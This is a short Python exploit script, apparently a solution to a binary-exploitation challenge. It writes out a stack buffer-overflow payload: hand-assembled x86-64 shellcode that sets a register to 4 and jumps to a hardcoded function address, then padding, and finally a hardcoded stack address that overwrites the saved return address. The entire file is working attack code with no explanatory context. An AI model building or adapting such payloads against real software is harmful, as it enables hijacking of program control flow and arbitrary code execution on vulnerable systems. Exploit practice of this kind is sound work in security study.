import sys
import struct

stack_addr = 0x721000800fd0

shellcode = b'\x31\xff' + b'\xff\xc7'*4 + b'\x68\x88\x1a\x40\x00' + b'\xc3'

payload = shellcode.ljust(16, b'A')
payload += b'B' * 8
payload += struct.pack('<Q', stack_addr)

sys.stdout.buffer.write(payload)